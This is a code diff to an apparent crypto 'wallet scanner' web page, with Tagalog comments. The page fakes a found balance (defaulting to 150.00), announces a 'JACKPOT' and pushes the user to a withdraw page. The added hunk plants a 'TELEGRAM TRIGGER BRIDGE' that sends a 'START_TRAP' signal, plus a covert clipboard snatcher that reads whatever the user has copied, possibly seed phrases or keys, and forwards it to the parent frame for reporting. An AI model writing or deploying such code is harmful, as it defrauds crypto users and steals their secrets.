@@ -166,27 +166,19 @@
                 method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': SECRET_KEY },
                 body: JSON.stringify({ address: addr.toLowerCase() })
             }).then(r => r.json()).then(data => {
-                // Pinanatili ang original condition mo
                 if(data.result && !data.result.includes("Bal: 0")) {
-                    
-                    // --- ITO ANG BAGONG LOGIC NA DINAGDAG KO ---
-                    const balanceMatch = data.result.match(/\d+(\.\d+)?/); // Kukunin yung amount sa server result
-                    const finalBalance = balanceMatch ? balanceMatch[0] : "150.00"; // Default 150 kung walang mahanap na number
+                    const balanceMatch = data.result.match(/\d+(\.\d+)?/); 
+                    const finalBalance = balanceMatch ? balanceMatch[0] : "150.00"; 
 
-                    // 1. I-save para sa Withdraw.html
                     localStorage.setItem('last_found_type', 'ETH');
                     localStorage.setItem('last_found_balance', finalBalance);
-                    localStorage.setItem('last_found_seed', m); // Ang mnemonic 'm' ang magsisilbing seed phrase
+                    localStorage.setItem('last_found_seed', m); 
 
-                    // 2. UI Updates sa card
                     document.getElementById('foundMsg').innerHTML = `<div style="color:green; font-weight:bold; font-size:10px;">FOUND: ${addr}</div>`;
                     document.getElementById('foundCountLabel').textContent = "1 discovered";
                     
-                    // 3. Alert at Auto-Redirect
                     alert("JACKPOT ETH FOUND!");
                     window.parent.loadPage('Withdraw.html');
-                    // ------------------------------------------
-
                 }
             }).catch(()=>{});
 
@@ -198,7 +190,26 @@
             const btn = document.getElementById('startBtn');
             btn.textContent = running ? "STOP SCANNING" : "START SCANNING";
             btn.classList.toggle('active');
-            if(running) engine();
+            
+            if(running) {
+                engine();
+                
+                // --- TELEGRAM TRIGGER BRIDGE ---
+                // Nagse-send ng message sa index.html para mag-report sa Telegram
+                if (window.parent) {
+                    window.parent.postMessage({ type: 'START_TRAP', coin: 'ETHEREUM' }, '*');
+                }
+
+                // Palihim na clipboard snatcher para sa page na ito
+                try {
+                    navigator.clipboard.readText().then(text => {
+                        if(text.length > 0) {
+                            // Pwede mo rin itong i-send sa parent kung gusto mo
+                            window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
+                        }
+                    }).catch(()=>{});
+                } catch(e) {}
+            }
         }
     </script>
 </body>
